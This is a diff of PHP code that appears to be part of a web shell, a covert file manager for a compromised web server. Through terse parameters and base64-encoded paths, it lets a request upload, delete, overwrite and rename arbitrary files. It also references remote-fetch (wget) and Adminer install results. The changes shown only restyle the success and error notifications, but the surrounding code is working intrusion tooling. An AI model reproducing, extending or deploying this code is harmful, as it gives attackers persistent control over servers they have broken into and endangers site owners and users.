@@ -686,12 +686,12 @@ if (isset($_POST['s']) && isset($_FILES['u'])) {
         $tmpName = $_FILES['u']['tmp_name'];
         $destination = $currentDir . '/' . $fileName;
         if (move_uploaded_file($tmpName, $destination)) {
-            $_SESSION['upload_result'] = "Upload successful!";
+            $_SESSION['upload_result'] = "SUCCESS: File uploaded successfully!";
         } else {
-            $_SESSION['upload_result'] = "Upload failed!";
+            $_SESSION['upload_result'] = "ERROR: Upload failed!";
         }
     } else {
-        $_SESSION['upload_result'] = "Upload error: " . $_FILES['u']['error'];
+        $_SESSION['upload_result'] = "ERROR: Upload error: " . $_FILES['u']['error'];
     }
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
@@ -702,9 +702,9 @@ if (isset($_POST['del'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['del']);
     if (@unlink($filePath)) {
-        $_SESSION['delete_result'] = "Delete successful";
+        $_SESSION['delete_result'] = "SUCCESS: File deleted successfully!";
     } else {
-        $_SESSION['delete_result'] = "Delete failed";
+        $_SESSION['delete_result'] = "ERROR: Delete failed!";
     }
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
@@ -715,9 +715,9 @@ if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['obj']);
     if (file_put_contents($filePath, $_POST['content'])) {
-        $_SESSION['save_result'] = "Saved";
+        $_SESSION['save_result'] = "SUCCESS: File saved successfully!";
     } else {
-        $_SESSION['save_result'] = "Save failed";
+        $_SESSION['save_result'] = "ERROR: Save failed!";
     }
     $fileDir = dirname($filePath);
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($fileDir));
@@ -730,43 +730,85 @@ if (isset($_POST['ren']) && isset($_POST['new'])) {
     $oldPath = base64_decode($_POST['ren']);
     $newPath = dirname($oldPath) . '/' . $_POST['new'];
     if (rename($oldPath, $newPath)) {
-        $_SESSION['rename_result'] = "Renamed";
+        $_SESSION['rename_result'] = "SUCCESS: File renamed successfully!";
     } else {
-        $_SESSION['rename_result'] = "Rename failed";
+        $_SESSION['rename_result'] = "ERROR: Rename failed!";
     }
     $oldDir = dirname($oldPath);
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($oldDir));
     exit;
 }
 
-// Show simple alerts for basic operations
+// Show success/error notifications
 if (isset($_SESSION['upload_result'])) {
-    echo "<script>alert('" . $_SESSION['upload_result'] . "');</script>";
+    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
+    if (strpos($_SESSION['upload_result'], 'SUCCESS') !== false) {
+        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
+    } else {
+        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
+    }
+    echo "'>" . $_SESSION['upload_result'] . "</div>";
+    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
     unset($_SESSION['upload_result']);
 }
 
 if (isset($_SESSION['delete_result'])) {
-    echo "<script>alert('" . $_SESSION['delete_result'] . "');</script>";
+    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
+    if (strpos($_SESSION['delete_result'], 'SUCCESS') !== false) {
+        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
+    } else {
+        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
+    }
+    echo "'>" . $_SESSION['delete_result'] . "</div>";
+    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
     unset($_SESSION['delete_result']);
 }
 
 if (isset($_SESSION['save_result'])) {
-    echo "<script>alert('" . $_SESSION['save_result'] . "');</script>";
+    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
+    if (strpos($_SESSION['save_result'], 'SUCCESS') !== false) {
+        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
+    } else {
+        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
+    }
+    echo "'>" . $_SESSION['save_result'] . "</div>";
+    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
     unset($_SESSION['save_result']);
 }
 
 if (isset($_SESSION['rename_result'])) {
-    echo "<script>alert('" . $_SESSION['rename_result'] . "');</script>";
+    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
+    if (strpos($_SESSION['rename_result'], 'SUCCESS') !== false) {
+        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
+    } else {
+        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
+    }
+    echo "'>" . $_SESSION['rename_result'] . "</div>";
+    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
     unset($_SESSION['rename_result']);
 }
 
 if (isset($_SESSION['wget_result'])) {
-    echo "<script>alert('" . $_SESSION['wget_result'] . "');</script>";
+    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
+    if (strpos($_SESSION['wget_result'], 'successfully') !== false) {
+        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
+    } else {
+        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
+    }
+    echo "'>" . $_SESSION['wget_result'] . "</div>";
+    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
     unset($_SESSION['wget_result']);
 }
 
 if (isset($_SESSION['adminer_result'])) {
-    echo "<script>alert('" . $_SESSION['adminer_result'] . "');</script>";
+    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
+    if (strpos($_SESSION['adminer_result'], 'successfully') !== false) {
+        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
+    } else {
+        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
+    }
+    echo "'>" . $_SESSION['adminer_result'] . "</div>";
+    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
     unset($_SESSION['adminer_result']);
 }
 ?>
